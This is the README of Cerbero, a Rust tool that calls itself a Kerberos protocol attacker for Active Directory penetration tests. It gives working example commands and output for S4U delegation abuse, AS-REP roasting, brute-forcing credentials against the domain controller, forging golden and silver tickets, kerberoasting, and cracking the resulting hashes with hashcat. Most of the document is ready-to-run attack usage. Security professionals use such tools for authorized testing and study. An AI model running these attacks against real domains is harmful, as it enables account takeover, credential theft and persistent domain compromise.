<!-- cargo-sync-readme start -->

# Cerbero

![Crates.io](https://img.shields.io/crates/v/https://crates.io/crates/cerbero)

Kerberos protocol attacker. Tool to perform several tasks
related with Kerberos protocol in an Active Directory pentest.

## Installation

From crates:
```sh
cargo install cerbero
```

From repo:
```sh
git clone https://gitlab.com/Zer1t0/cerbero.git
cd cerbero/
cargo install --path .
```

## Commands
- [ask](#ask)
    + [TGT](#tgt)
    + [TGS](#tgs)
    + [S4U2self](#S4U2self)
    + [S4U2proxy](#S4U2proxy)
- [asreproast](#asreproast)
- [brute](#brute)
- [convert](#convert)
- [craft](#craft)
- [hash](#hash)
- [kerberoast](#kerberoast)
- [list](#list)

### Ask
The `ask` command allows to retrieve Kerberos tickets (TGT/TGS) from the KDC
(Domain Controller in Active Directory environment). Moreover, it also
perform requests to obtain tickets by using the S4U2Self and S4U2Proxy
Kerberos extensions.

#### TGT
Ask TGT:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234!
INFO - Request contoso.local/anakin TGT for contoso.local
INFO - Save contoso.local/anakin TGT for contoso.local in anakin.ccache
```

#### TGS
Ask TGS:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -s ldap/dc01
INFO - Get contoso.local/anakin TGT for contoso.local from anakin.ccache
INFO - Request contoso.local/anakin TGS for ldap/dc01
INFO - Save contoso.local/anakin TGS for ldap/dc01 in anakin.ccache
```

Inter-realm TGS:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -s ldap/dc01.poke.mon
```

#### S4U2self
Perform S4u2self:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -i han
WARN - No contoso.local/anakin TGT for contoso.local found in anakin.ccache: No TGT found for 'anakin
INFO - Request contoso.local/anakin TGT for contoso.local
INFO - Save contoso.local/anakin TGT for contoso.local in anakin.ccache
INFO - Request contoso.local/han S4U2Self TGS for contoso.local/anakin
INFO - Save contoso.local/han S4U2Self TGS for contoso.local/anakin in anakin.ccache
```

Inter-realm S4U2proxy:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -i poke.mon/pikachu
```

Perform S4u2self for a given service of the user:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -i han --user-service service/anakin
INFO - Get contoso.local/anakin TGT for contoso.local from anakin.ccache
INFO - Request contoso.local/han S4U2Self TGS for service/anakin
INFO - Save contoso.local/han S4U2Self TGS for service/anakin in anakin.ccache
```

#### S4U2proxy
Perform S4u2proxy:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -i han -s service2/leia
WARN - No contoso.local/anakin TGT for contoso.local found in anakin.ccache: No TGT found for 'anakin
INFO - Request contoso.local/anakin TGT for contoso.local
INFO - Save contoso.local/anakin TGT for contoso.local in anakin.ccache
WARN - No contoso.local/han S4U2Self TGS for contoso.local/anakin found
INFO - Request contoso.local/han S4U2Self TGS for contoso.local/anakin
INFO - Save contoso.local/han S4U2Self TGS for contoso.local/anakin in anakin.ccache
INFO - Request contoso.local/han S4U2Proxy TGS for service2/leia
INFO - Save contoso.local/han S4U2proxy TGS for service2/leia in anakin.ccache
```

Inter-realm S4U2Proxy:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -i han -s service/pikachu.poke.mon
```

You can also perform s4u2proxy by changing the target service in the final TGS for the user:
```shell
$ cerbero ask -vv -u contoso.local/anakin -p Vader1234! -i han -s HTTP/dc01 --rename-service ldap/dc01
WARN - No contoso.local/anakin TGT for contoso.local found in anakin.ccache: No TGT found for 'anakin
INFO - Request contoso.local/anakin TGT for contoso.local
INFO - Save contoso.local/anakin TGT for contoso.local in anakin.ccache
WARN - No contoso.local/han S4U2Self TGS for service/anakin found
INFO - Request contoso.local/han S4U2Self TGS for contoso.local/anakin
INFO - Save contoso.local/han S4U2Self TGS for contoso.local/anakin in anakin.ccache
INFO - Request contoso.local/han S4U2Proxy TGS for HTTP/dc01
INFO - Received contoso.local/han S4U2proxy TGS for HTTP/dc01
INFO - Rename service from HTTP/dc01 to ldap/dc01
INFO - Save contoso.local/han S4U2proxy TGS for ldap/dc01 in anakin.ccache

```

### AsRepRoast
`asreproast` can be used to discover users that do not require
pre-authentication and retrieve a ticket to crack with hashcat or john.

Check many users:
```shell
cerbero asreproast under.world users.txt
```

Check many users with weak RC4 cipher (easier to crack):
```shell
cerbero asreproast under.world users.txt --cipher rc4
```

### Brute
`brute` performs TGTs requests in order to discover user credentials
based on the KDC response. This bruteforce technique allows you to
discover:
+ Valid username/password pairs
+ Valid usernames
+ Expired passwords
+ Blocked or disabled users

This attack should be performed carefully since can block user
accounts in case of perform many incorrect authentication attemps
for the same user.

Test many users and passwords:
```shell
cerbero brute under.world users.txt passwords.txt
```

Test one user and many passwords:
```shell
cerbero brute under.world Zeus passwords.txt
```

Test many users and one password:
```shell
cerbero brute under.world users.txt Olympus1234
```

Test one user and one password:
```shell
cerbero brute under.world Zeus Olympus1234
```

### Convert
`convert` ticket files between krb (Windows) and
ccache (Linux) formats.

Convert ccache to krb:
```shell
$ cerbero convert -i anakin.ccache -o anakin.krb -vv
INFO - Read anakin.ccache with ccache format
INFO - Detected krb format from output file extension
INFO - Save anakin.krb with krb format
```

Convert krb to ccache:
```shell
$ cerbero convert -i anakin.krb -o anakin.ccache -vv
INFO - Read anakin.krb with krb format
INFO - Detected ccache format from output file extension
INFO - Save anakin.ccache with ccache format
```
### Craft
To `craft` golden and silver tickets.

Craft a golden ticket (by using the `krbtgt` AES256 key):
```shell
$ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --aes fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c -vv
INFO - Save kratos TGT in kratos.ccache
```

Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
```shell
$ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --ntlm 29f9ab984728cc7d18c8497c9ee76c77 -s cifs/styx,under.world -vv
INFO - Save kratos TGS for cifs/styx.under.world in kratos.ccache
```

### Hash
Calculate the Kerberos keys (password hashes) from the user password.

Calculate RC4 key (NT hash):
```shell
$ cerbero hash 'IamtheKingofD34d!!'
rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
```

Calculate all the keys:
```shell
$ cerbero hash 'IamtheKingofD34d!!' -u under.world/Hades
rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
aes128:fe165dec904772a90a177069e4ea7019
aes256:1304965c35176aeb72e1ae5fdd6c2fe2e901af7223cb75f5eaac25ad667136e7
```

### Kerberoast
To format encrypted part of tickets in order to be cracked by hashcat or john.

You need to provide a file with the user services. Each line of the file
must have one of the following formats:
* `user`
* `domain/user`
* `user:spn`
* `domain/user:spn`

When a service [SPN](https://en.hackndo.com/service-principal-name-spn/)
is not specified, then a
[NT-ENTERPRISE principal](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
is used. This can also be useful to bruteforce users with services.

An example file is the following:
```rust
sara
jack:HTTP/webserver
cake.com/john
cake.com/peter:HTTP/peter-pc
```

By using that file you could obtain a result like the following:
```shell
$ cerbero kerberoast u contoso.local/jaime -p Jama1234! -s /tmp/users.txt | tee /tmp/hashes.txt
$krb5tgs$23$*sara$CONTOSO.LOCAL$sara@contoso.local*$637b06b244ad69bf30d9b0a956c6143....5f69271
$krb5tgs$23$*jack$CONTOSO.LOCAL$HTTP/webserver*$8723987493798178273879856c6....ab78677
$krb5tgs$23$*john$CAKE.COM$john@CAKE.COM*$87687619876bde9879879879....1111111
$krb5tgs$23$*peter$CAKE.COM$HTTP/peter-pc*$2c77d95792f1393d3f25aec157823....4f6085f
```

To get a list of users with services you can use `ldapsearch`:
```shell
$ ldapsearch -h 192.168.100.2 -b "dc=contoso,dc=local" -w Vader1234!  -D "Anakin@contoso.local" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" samaccountname | grep -i samaccountname: | cut -d ' ' -f 2 | tee users.txt
anakin
leia
```

The tickets could be cracked by using the following [hashcat](https://hashcat.net/) command:
```shell
$ hashcat -m 13100 /tmp/hashes.txt wordlist.txt
```
### List
`list` shows the tickets information of a credentials file. Similar
to `klist` command.

```shell
$ cerbero list hades.ccache
Ticket cache (ccache): FILE:hades.ccache

Hades@UNDER.WORLD => krbtgt/UNDER.WORLD@UNDER.WORLD
Valid starting: 01/12/2021 12:08:09
Expires: 01/12/2021 22:08:09
Renew until: 01/19/2021 12:08:09
Flags: 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
Etype (skey, tkt): 18 -> aes256-cts-hmac-sha1-96, 18 -> aes256-cts-hmac-sha1-96
```

## Credits
This work is based on great work of other people:
- [Impacket](https://github.com/SecureAuthCorp/impacket) of Alberto Solino [@agsolino](https://github.com/agsolino)
- [Rubeus](https://github.com/GhostPack/Rubeus) of Will [@harmj0y](https://twitter.com/harmj0y) and Elad Shamir [@elad_shamir](https://twitter.com/elad_shamir)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) of [@gentilkiwi](https://twitter.com/gentilkiwi)

<!-- cargo-sync-readme end -->
